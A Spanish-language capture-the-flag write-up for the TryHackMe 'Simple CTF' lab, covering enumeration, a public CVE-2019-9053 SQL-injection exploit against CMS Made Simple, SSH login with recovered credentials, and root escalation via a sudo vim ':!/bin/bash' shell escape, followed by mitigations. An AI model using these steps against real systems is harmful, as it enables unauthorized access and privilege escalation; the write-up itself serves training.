# Simple CTF — THM

**Plataforma:** TryHackMe  
**Dificultad:** Fácil  
**Categoría:** Linux / FTP / CMS Made Simple / SSH / Sudo / Vim

## 1. Reconocimiento

### Nmap

- Lanzamos un escaneo para identificar los puertos y servicios:

```bash
nmap -sCV -Pn 10.128.169.184
```

- Encontramos:

- `21/tcp` → FTP
- `80/tcp` → HTTP
- `2222/tcp` → SSH

- El servicio SSH utiliza un puerto no estándar, `2222`.

- Durante la enumeración también encontramos que el servidor FTP permite acceso anónimo:

```text
ftp-anon: Anonymous FTP login allowed (FTP code 230)
```

## 2. Enumeración

### Enumeración web

- Realizamos fuzzing sobre el servidor web:

```bash
ffuf -u http://10.128.169.184/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
```

- Encontramos:

```text
/simple/
```

- Accedemos a:

```text
http://10.128.169.184/simple/
```

- Dentro encontramos una aplicación **CMS Made Simple**.

- Mediante la aplicación identificamos la versión:

```text
CMS Made Simple 2.2.8
```

### Enumeración FTP

- Nos conectamos al servidor FTP:

```bash
ftp 10.128.169.184
```

- Como permite acceso anónimo, podemos entrar sin credenciales.

- Desactivamos el modo pasivo:

```text
passive
```

- Enumeramos los archivos:

```text
ls
```

- Encontramos:

```text
ForMitch.txt
```

- Lo descargamos:

```text
get ForMitch.txt
```

- Al leerlo encontramos:

```text
You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
```

- El mensaje nos indica que existe un usuario del sistema llamado `mitch` y que su contraseña es débil.

### Enumeración de CMS Made Simple

- Volvemos a la aplicación:

```text
http://10.128.169.184/simple/
```

- Realizamos fuzzing dentro del directorio:

```bash
ffuf -u http://10.128.169.184/simple/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
```

- Encontramos:

```text
/modules
/uploads
/doc
/admin
/lib
/tmp
```

- El directorio `/admin/` contiene el panel de administración.

```text
http://10.128.169.184/simple/admin/login.php
```

- La versión `2.2.8` es vulnerable a **CVE-2019-9053**.

### CVE-2019-9053

- Buscamos un exploit específico para CMS Made Simple 2.2.8.

- Encontramos:

```text
https://github.com/Perseus99999/CVE-2019-9053-working-
```

- La vulnerabilidad permite realizar un **SQL Injection** para recuperar información del usuario, incluyendo el hash de su contraseña.

## 3. Explotación

### Explotación de CVE-2019-9053

- Utilizamos el exploit:

```bash
python3 46635.py -u http://192.168.173.148/simple/ -w /usr/share/wordlists/rockyou.txt
```

- El exploit consigue recuperar información del usuario:

```text
salt = 1dac0d92e9fa6bb2
username = mitch
email = admin@admin.com
password = secret
```

- Hemos obtenido las credenciales:

```text
Usuario: mitch
Contraseña: secret
```

### Acceso mediante SSH

- El servicio SSH está escuchando en el puerto `2222`, por lo que utilizamos `-p`:

```bash
ssh -p 2222 mitch@10.128.169.184
```

- Introducimos:

```text
secret
```

- Conseguimos acceder al sistema como `mitch`.

## 4. Escalada de privilegios

### Enumeración de sudo

- Comprobamos qué comandos puede ejecutar `mitch` mediante `sudo`:

```bash
sudo -l
```

- Encontramos:

```text
(root) NOPASSWD: /usr/bin/vim
```

- Esto significa que `mitch` puede ejecutar `vim` como `root` sin introducir contraseña.

### Abuso de Vim

- Ejecutamos:

```bash
sudo /usr/bin/vim
```

- Vim permite ejecutar comandos del sistema mediante `:!`.

- Desde dentro de Vim ejecutamos:

```vim
:!/bin/bash
```

- Vim lanza una shell con los mismos privilegios del proceso que lo ejecuta.

- Como Vim ha sido ejecutado mediante `sudo` como `root`, la shell también tiene privilegios de `root`.

- Comprobamos:

```bash
whoami
```

- Obtenemos:

```text
root
```

- Ya tenemos privilegios máximos.

## 5. Reporte

- La máquina **Simple CTF** expone FTP, HTTP y SSH.
- El FTP permite acceso anónimo y contiene el archivo `ForMitch.txt`, que proporciona una pista sobre un usuario del sistema y una contraseña débil.
- Mediante fuzzing web encontramos `/simple/`, donde identificamos **CMS Made Simple 2.2.8**.
- La aplicación contiene un panel de administración en `/simple/admin/login.php`.
- Investigando la versión encontramos **CVE-2019-9053**, una vulnerabilidad que permite recuperar credenciales mediante SQL Injection.
- Utilizamos el exploit y obtenemos las credenciales de `mitch`:
```text
mitch : secret
```
- Utilizamos las credenciales para acceder mediante SSH por el puerto `2222`.
- Una vez dentro, ejecutamos `sudo -l` y encontramos que `mitch` puede ejecutar `/usr/bin/vim` como `root` sin contraseña.
- Aprovechamos la funcionalidad `:!` de Vim para ejecutar `/bin/bash`.
- Como Vim se está ejecutando como `root`, obtenemos una shell con privilegios de `root`.
- Finalmente obtenemos la Root Flag.

### Cadena de ataque

```text
Nmap
 ↓
FTP Anonymous
 ↓
ForMitch.txt
 ↓
HTTP
 ↓
CMS Made Simple 2.2.8
 ↓
CVE-2019-9053
 ↓
SQL Injection
 ↓
Credenciales mitch
 ↓
SSH :2222
 ↓
sudo -l
 ↓
vim como root
 ↓
:!/bin/bash
 ↓
root
```

### Vulnerabilidades encontradas

| Vulnerabilidad | Severidad | Impacto |
|---|---|---|
| FTP Anonymous Access | Media | Permite acceder a archivos sin autenticación |
| CMS Made Simple 2.2.8 — CVE-2019-9053 | Alta | Permite recuperar credenciales mediante SQL Injection |
| Credenciales débiles/reutilizadas | Alta | Permiten acceso mediante SSH |
| `vim` permitido mediante sudo | Crítica | Permite ejecutar una shell como root |

### Mitigaciones

- Deshabilitar el acceso anónimo a FTP.
- No almacenar información sensible en recursos accesibles sin autenticación.
- Actualizar CMS Made Simple a una versión corregida.
- Utilizar consultas parametrizadas para prevenir SQL Injection.
- Utilizar contraseñas fuertes y únicas.
- Limitar los comandos permitidos mediante `sudo`.
- No permitir que usuarios sin privilegios ejecuten editores como `vim` mediante `sudo`.
- Aplicar el principio de mínimo privilegio.

## 🧠 Lessons Learned

- Un servicio FTP con acceso anónimo puede revelar archivos útiles para continuar la enumeración.
- Los puertos no estándar, como `2222` para SSH, deben tenerse en cuenta durante el reconocimiento.
- `ffuf` permite descubrir directorios y archivos que no aparecen directamente en la página.
- Identificar la versión exacta de un CMS facilita la búsqueda de vulnerabilidades conocidas.
- CVE-2019-9053 permite obtener credenciales mediante SQL Injection en versiones vulnerables de CMS Made Simple.
- `sudo -l` permite descubrir qué binarios puede ejecutar un usuario con privilegios elevados.
- Editores como Vim pueden ser peligrosos cuando se permiten mediante `sudo` porque pueden ejecutar comandos del sistema.
- `:!` permite ejecutar comandos externos desde Vim.
- Un binario permitido mediante `sudo` puede convertirse en un vector de escalada incluso aunque su función original no sea administrativa.
